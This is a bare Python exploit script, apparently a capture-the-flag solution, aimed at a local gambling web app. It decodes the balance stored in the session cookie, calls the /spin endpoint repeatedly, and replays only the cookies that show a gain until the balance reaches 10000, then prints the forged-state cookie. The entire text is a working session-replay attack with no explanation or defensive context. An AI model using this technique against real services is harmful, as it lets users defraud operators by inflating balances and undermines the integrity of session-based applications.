import requests
import base64
import json

HOST = 'http://localhost:8080'


def cookie_value(cookie):
    data = json.loads(base64.b64decode(cookie.split('.')[0] + '==').decode())
    return data['balance']


session_cookie = requests.get(HOST).cookies['session']

while cookie_value(session_cookie) < 10000:
    resp = requests.post(HOST + '/spin', cookies={'session': session_cookie})
    new_session_cookie = resp.cookies['session']

    if cookie_value(new_session_cookie) > cookie_value(session_cookie):
        session_cookie = new_session_cookie
        print(f'[.] Now at {cookie_value(new_session_cookie)}$')

print(f'[+] Cookie: {session_cookie}')